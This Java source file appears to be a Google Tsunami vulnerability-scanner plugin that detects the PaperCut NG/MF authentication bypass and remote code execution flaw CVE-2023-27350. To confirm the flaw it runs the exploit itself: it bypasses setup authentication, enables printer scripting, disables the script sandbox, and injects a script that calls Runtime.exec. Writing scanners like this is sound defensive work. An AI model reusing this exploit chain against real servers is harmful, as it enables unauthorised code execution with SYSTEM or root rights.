/*
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.papercut;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.time.Clock;
import java.time.Instant;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.inject.Inject;

/** A VulnDetector plugin to for CVE-2023-27350. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "PapercutNgMfVulnDetector",
    version = "1.0",
    description = "Detects papercut versions that are vulnerable to authentication bypass and RCE.",
    author = "Isaac_GC (isaac@nu-that.us)",
    bootstrapModule = PapercutNgMfVulnDetectorBootstrapModule.class)
public final class PapercutNgMfVulnDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;

  @Inject
  PapercutNgMfVulnDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2023-27350 (PaperCut NG/MF) starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    boolean isVulnerable = false;

    PapercutNgMfHelper helper = new PapercutNgMfHelper(networkService, this.httpClient);

    HttpResponse response = helper.sendGetRequest("service=page/SetupCompleted");
    Matcher bodyContentMatcher =
        Pattern.compile("Configuration Wizard : Setup Complete")
            .matcher(response.bodyString().orElse(""));

    // If all initial checks pass, then lets check the RCE vuln
    if (response.status() == HttpStatus.OK
        && bodyContentMatcher.find()
        && !helper.jsessionId.isEmpty()) {

      // SetupCompleted payload/page
      HashMap<String, String> setupCompletedPage = new HashMap<String, String>();
      setupCompletedPage.put("service", "direct/1/SetupCompleted/$Form");
      setupCompletedPage.put("sp", "S0");
      setupCompletedPage.put("Form0", "$Hidden,analyticsEnabled,$Submit");
      setupCompletedPage.put("$Hidden", "true");
      setupCompletedPage.put("$Submit", "true");

      // Post/send above params
      helper.sendPostRequest(helper.buildParameterString(setupCompletedPage));

      // Changing (or attempting to) change the settings required for RCE
      helper.changeSettingForPayload("print-and-device.script.enable", true);
      helper.changeSettingForPayload("print.script.sandboxed", false);

      helper.sendGetRequest("service=page/PrinterList"); // Get list of printers
      helper.sendGetRequest(
          "service=direct/1/PrinterList/selectPrinter&sp=l1001"); // Get the first one
      helper.sendGetRequest(
          "service=direct/1/PrinterDetails/printerOptionsTab.tab&sp=4"); // Open up scripting tab

      // Let's build and send the actual payload
      HashMap<String, String> printerScriptPayload = new HashMap<String, String>();
      printerScriptPayload.put("service", "direct/1/PrinterDetails/$PrinterDetailsScript.$Form");
      printerScriptPayload.put("sp", "S0");
      printerScriptPayload.put(
          "Form0", "printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1");
      printerScriptPayload.put("printerId", "l1001");
      printerScriptPayload.put("enablePrintScript", "on");

      // Build the payload string to inject
      Payload payload;
      if (payloadGenerator.isCallbackServerEnabled()) {
        PayloadGeneratorConfig config =
            PayloadGeneratorConfig.newBuilder()
                .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
                .setInterpretationEnvironment(
                    PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
                .setExecutionEnvironment(
                    PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
                .build();

        payload = this.payloadGenerator.generate(config);

        printerScriptPayload.put(
            "scriptBody",
            "function printJobHook(inputs, actions) {}\r\n"
                + "java.lang.Runtime.getRuntime().exec('"
                + payload.getPayload()
                + "');");
        printerScriptPayload.put("$Submit$1", "Apply");

        // Sending payload
        helper.sendPostRequest(helper.buildParameterString(printerScriptPayload));
        try {
          Thread.sleep(1000);
        } catch (InterruptedException err) {
          logger.atWarning().withCause(err).log();
        }

        // Check payload
        isVulnerable = payload.checkIfExecuted();

      } else { // If the callback server is not enabled, try to verify the payload through some
        // limited checks.
        printerScriptPayload.put(
            "scriptBody",
            "function printJobHook(inputs, actions) {}\r\n"
                + "java.lang.Runtime.getRuntime().exec('hostname');"); // If we can even do this,
        // that's all we really can do
        printerScriptPayload.put("$Submit$1", "Apply");

        // Sending payload
        HttpResponse payloadResponse =
            helper.sendPostRequest(helper.buildParameterString(printerScriptPayload));

        Matcher matchResponseResult =
            Pattern.compile("Saved successfully") // Check for this message in the response
                .matcher(payloadResponse.bodyString().orElse(""));

        // If the resulting string in response matched, then the script got submitted and an RCE is
        // possible
        isVulnerable = matchResponseResult.find();
      }

      // Changing (or attempting to) change the settings required for RCE
      helper.changeSettingForPayload("print-and-device.script.enable", false);
      helper.changeSettingForPayload("print.script.sandboxed", true);

      return isVulnerable;
    }
    return false; // Do this as default
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2023_27350"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Papercut NG/MF Authentication Bypass and RCE")
                .setDescription(
                    "This vulnerability allows remote attackers to bypass authentication"
                        + " on affected installations of PaperCut NG/MF."
                        + " Authentication is not required to exploit this vulnerability."
                        + " The specific flaw exists within the SetupCompleted class and the"
                        + " issue results from improper access control."
                        + " An attacker can leverage this vulnerability to bypass authentication"
                        + " and execute arbitrary code in the context of SYSTEM (Windows) "
                        + "or Root/Papercut User (Linux).")
                .setRecommendation(
                    "Update to versions that are at least 20.1.7, 21.2.11, 22.0.9, or any later"
                        + " version."))
        .build();
  }
}
